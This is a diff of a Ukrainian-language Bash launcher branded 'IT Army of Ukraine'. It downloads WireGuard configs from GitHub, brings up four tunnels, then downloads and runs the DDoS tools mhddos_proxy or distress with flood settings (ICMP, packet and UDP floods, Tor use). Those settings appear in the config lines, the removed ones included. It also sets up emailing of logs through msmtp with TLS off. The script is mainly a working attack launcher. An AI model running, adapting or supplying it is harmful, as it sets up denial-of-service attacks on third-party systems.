@@ -1,13 +1,47 @@
 #!/bin/bash
 set -e
 
+# === ASCII-ЛОГОТИП IT ARMY OF UA ===
+echo -e "\e[1;33m"
+cat << "EOF"
+╔════════════════════════════════════════════════════════════════════════╗
+║                                                                        ║
+║   ██╗████████╗     █████╗ ██████╗ ███╗   ███╗██╗   ██╗                 ║
+║   ██║╚══██╔══╝    ██╔══██╗██╔══██╗████╗ ████║╚██╗ ██╔╝                 ║
+║   ██║   ██║       ███████║██████╔╝██╔████╔██║ ╚████╔╝                  ║
+║   ██║   ██║       ██╔══██║██╔═══╝ ██║╚██╔╝██║  ╚██╔╝                   ║
+║   ██║   ██║       ██║  ██║██║     ██║ ╚═╝ ██║   ██║                    ║
+║   ╚═╝   ╚═╝       ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝   ╚═╝                    ║
+║                                                                        ║
+║                   💻  I T   A R M Y   O F   U K R A I N E              ║
+╚════════════════════════════════════════════════════════════════════════╝
+EOF
+echo -e "\e[0m"
+
+# === ЗМІННІ ===
 SETTINGS_FILE="$HOME/.kaljan747_settings"
 LOG_DIR="$HOME/logs"
 LOG_FILE="$LOG_DIR/wg.log"
 mkdir -p "$LOG_DIR"
 touch "$LOG_FILE"
 
-# === Функції для запиту ===
+# === ЛОГУВАННЯ ===
+log() {
+    MSG="[$(date +'%Y-%m-%d %H:%M:%S')] $1"
+    echo -e "\e[1;36m[LOG] $MSG\e[0m"
+    echo "$MSG" >> "$LOG_FILE"
+}
+
+# === EMAIL-КОНФІГ ===
+echo "Введіть email для отримання логів (або залиште порожнім):"
+read EMAIL_TARGET
+if [[ "$EMAIL_TARGET" =~ ^.+@.+\..+$ ]]; then
+  echo "EMAIL=\"$EMAIL_TARGET\"" >> "$SETTINGS_FILE"
+  echo -e "defaults\nauth on\ntls off\nlogfile ~/.msmtp.log\naccount default\nhost smtp.ukr.net\nport 2525\nfrom user@ukr.net\nuser user@ukr.net\npassword your_password\naccount default : default" > ~/.msmtprc
+  chmod 600 ~/.msmtprc
+fi
+
+# === ФУНКЦІЇ GUI/CLI ===
 ask_user_id() {
     if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
         USER_ID=$(zenity --entry --title="Введення USER-ID" --text="Введіть ваш user-id (тільки цифри):" --width=400)
@@ -32,13 +66,11 @@ ask_run_parameters() {
         echo "2) distress"
         read -p "Ваш вибір (1/2): " mod_choice
         SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )
-
         echo "Редагувати INI перед запуском?"
         echo "1) Так"
         echo "2) Ні"
         read -p "Ваш вибір (1/2): " edit_choice
         EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )
-
         echo "Виберіть режим запуску:"
         echo "1) screen у фоні"
         echo "2) screen відкрито"
@@ -52,164 +84,74 @@ ask_run_parameters() {
     fi
 }
 
-# === Завантаження/запит налаштувань ===
-if [ -f "$SETTINGS_FILE" ]; then
-    source "$SETTINGS_FILE"
-fi
+# === ЗАПИТ НАЛАШТУВАНЬ ===
+if [ -f "$SETTINGS_FILE" ]; then source "$SETTINGS_FILE"; fi
+if [ -z "$USER_ID" ]; then while true; do ask_user_id; [[ "$USER_ID" =~ ^[0-9]+$ ]] && break; done; fi
+if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then ask_run_parameters; fi
 
-if [ -z "$USER_ID" ]; then
-    while true; do
-        ask_user_id
-        if [ -z "$USER_ID" ]; then
-            echo "User-id обов'язковий. Завершення."
-            exit 1
-        fi
-        if [[ "$USER_ID" =~ ^[0-9]+$ ]]; then
-            break
-        else
-            echo "Помилка: USER-ID має містити тільки цифри!"
-        fi
-    done
-fi
+# === ПЕРЕВІРКА SUDO ===
+if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO=$(command -v sudo || echo ""); fi
+[ -z "$SUDO" ] && { echo "Потрібен sudo."; exit 1; }
 
-if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then
-    ask_run_parameters
-fi
+# === ВСТАНОВЛЕННЯ ЗАЛЕЖНОСТЕЙ ===
+$SUDO apt update -y
+$SUDO apt install -y curl wget git screen sed wireguard msmtp zenity
 
-# === Пошук або підтвердження папки wg_confs ===
-if [ -z "$WG_DIR" ] || [ ! -d "$WG_DIR" ]; then
-    echo "[+] Шукаю папку wg_confs..."
-    WG_DIRS=($(find "$HOME" -type d -name "wg_confs" 2>/dev/null))
-    if [ ${#WG_DIRS[@]} -eq 0 ]; then
-        echo "[!] У $HOME не знайдено, шукаю у всій файловій системі..."
-        WG_DIRS=($(find / -type d -name "wg_confs" 2>/dev/null))
-    fi
-    if [ ${#WG_DIRS[@]} -eq 0 ]; then
-        echo "[-] Папку wg_confs не знайдено."
-        exit 1
-    fi
-    if [ ${#WG_DIRS[@]} -gt 1 ]; then
-        echo "[+] Знайдено кілька папок wg_confs:"
-        for i in "${!WG_DIRS[@]}"; do
-            echo "$((i+1))) ${WG_DIRS[$i]}"
-        done
-        if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
-            SELECTED_INDEX=$(zenity --list --title="Виберіть папку wg_confs" --column="Номер" --column="Папка" $(for i in "${!WG_DIRS[@]}"; do echo "$((i+1))" "${WG_DIRS[$i]}"; done) --width=600 --height=400 | awk '{print $1}')
-        else
-            read -p "Введіть номер потрібної папки: " SELECTED_INDEX
-        fi
-        WG_DIR="${WG_DIRS[$((SELECTED_INDEX-1))]}"
-    else
-        WG_DIR="${WG_DIRS[0]}"
-    fi
-    echo "WG_DIR=\"$WG_DIR\"" >> "$SETTINGS_FILE"
-fi
+# === ЗАВАНТАЖЕННЯ WG-КОНФІГІВ ===
+WG_DIR="$HOME/wg_confs"
+mkdir -p "$WG_DIR"
+WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
+CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=\").*?\\.conf(?=\")' | grep '/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|')
+for url in $CONF_LIST; do wget -qO "$WG_DIR/$(basename $url)" "$url"; done
+log "Конфіги WireGuard завантажено"
 
-echo "[+] Використовую папку: $WG_DIR"
+# === ПІДКЛЮЧЕННЯ ТУНЕЛІВ ===
+INTERFACES=()
+for conf in $(find "$WG_DIR" -name '*.conf' | shuf | head -n 4); do
+    IFACE_NAME=$(basename "$conf" .conf)
+    $SUDO wg-quick up "$conf" && INTERFACES+=("$IFACE_NAME")
+    sleep 1
+    log "Підключено $IFACE_NAME"
+done
 
-# === Перевірка прав користувача ===
-if [ "$(id -u)" -eq 0 ]; then
-    SUDO=""
-else
-    if command -v sudo >/dev/null 2>&1; then
-        SUDO="sudo"
-    else
-        echo "sudo не знайдено. Встановіть або увійдіть як root."
-        exit 1
-    fi
-fi
-
-# === Встановлення залежностей ===
-if command -v apt >/dev/null 2>&1; then
-    $SUDO apt update -y
-    $SUDO apt install -y curl wget git screen sed wireguard zenity
-else
-    echo "Підтримуваний пакетний менеджер не знайдено."
-    exit 1
-fi
-
-# === Підготовка папок ===
+# === ВСТАНОВЛЕННЯ МОДУЛЯ ===
 MODULE_DIR="$HOME/modules"
 mkdir -p "$MODULE_DIR"
-touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"
-
-# === Завантаження модуля ===
 case "$SELECTED_MODULE" in
     mhddos_proxy)
         MODULE="$MODULE_DIR/mhddos_proxy"
         CONFIG_FILE="$MODULE_DIR/mhddos.ini"
-        MODULE_NAME="mhddos"
-        DOWNLOAD_LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
+        MODULE_URL="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
         ;;
     distress)
         MODULE="$MODULE_DIR/distress"
         CONFIG_FILE="$MODULE_DIR/distress.ini"
-        MODULE_NAME="distress"
-        DOWNLOAD_LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
+        MODULE_URL="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
         ;;
 esac
-
-[ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
+wget -qO "$MODULE" "$MODULE_URL"
 chmod +x "$MODULE"
 
-# === Зупинка всіх активних WG інтерфейсів ===
-for iface in $(wg show interfaces 2>/dev/null); do
-    $SUDO wg-quick down "$iface" 2>/dev/null || true
-    $SUDO ip link delete "$iface" 2>/dev/null || true
-done
+# === СТВОРЕННЯ INI ===
+INTERFACES_CSV=$(IFS=','; echo "${INTERFACES[*]}")
+echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces ${INTERFACES[*]} --user-id=$USER_ID" > "$CONFIG_FILE"
+log "INI створено: $CONFIG_FILE"
 
-# === Підключення 4 робочих тунелів ===
-check_wg_connection() {
-    curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null 2>&1
-}
+# === РЕДАГУВАННЯ INI ===
+[ "$EDIT_INI" = "Так" ] && { [ -n "$DISPLAY" ] && zenity --text-info --editable --filename="$CONFIG_FILE" || nano "$CONFIG_FILE"; }
 
-WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf))
-WG_IFACES=()
-INDEX=0
-
-while [ "${#WG_IFACES[@]}" -lt 4 ] && [ "$INDEX" -lt "${#WG_FILES[@]}" ]; do
-    conf="${WG_FILES[$INDEX]}"
-    IFACE_NAME=$(basename "$conf" .conf)
-    $SUDO wg-quick up "$conf" 2>/dev/null || true
-    sleep 2
-    if check_wg_connection "$IFACE_NAME"; then
-        echo "[+] Інтерфейс $IFACE_NAME працює."
-        echo "$(date '+%Y-%m-%d %H:%M:%S') [+] Інтерфейс $IFACE_NAME працює." >> "$LOG_FILE"
-        WG_IFACES+=("$IFACE_NAME")
-    else
-        echo "[-] Інтерфейс $IFACE_NAME не працює. Відключаю."
-        echo "$(date '+%Y-%m-%d %H:%M:%S') [-] Інтерфейс $IFACE_NAME не працює. Відключено." >> "$LOG_FILE"
-        $SUDO wg-quick down "$IFACE_NAME" 2>/dev/null || true
-        $SUDO ip link delete "$IFACE_NAME" 2>/dev/null || true
-    fi
-    INDEX=$((INDEX+1))
-done
-
-if [ "${#WG_IFACES[@]}" -lt 4 ]; then
-    echo "[-] Увага: вдалося підняти тільки ${#WG_IFACES[@]} тунелі."
-fi
-
-VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
-VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
-
-# === Оновлення INI файлів ===
-echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
-echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"
-
-if [ "$EDIT_INI" = "Так" ]; then
-    if [ -n "$DISPLAY" ]; then
-        zenity --text-info --editable --filename="$CONFIG_FILE" --title="Редагування INI" > "$CONFIG_FILE.tmp"
-        mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
-    else
-        nano "$CONFIG_FILE"
-    fi
-fi
-
-# === Запуск модуля ===
+# === ЗАПУСК У SCREEN ===
 case "$SELECTED_RUN_MODE" in
-    "screen у фоні") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
-    "screen відкрито") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
+    "screen у фоні") screen -dmS "KALJAN747" "$MODULE" $(cat "$CONFIG_FILE") ;; 
+    "screen відкрито") screen -S "KALJAN747" "$MODULE" $(cat "$CONFIG_FILE") ;;
     "без screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
 esac
+log "Модуль $SELECTED_MODULE запущено"
 
-exit 0
+# === ВІДПРАВКА ЛОГУ ===
+if [ -n "$EMAIL_TARGET" ]; then
+  echo -e "\n===== Kaljan747 Лог =====\n" | cat - "$LOG_FILE" | msmtp "$EMAIL_TARGET"
+  log "Звіт відправлено на $EMAIL_TARGET"
+fi
+
+log "Готово. Слідкуйте за логом: $LOG_FILE"
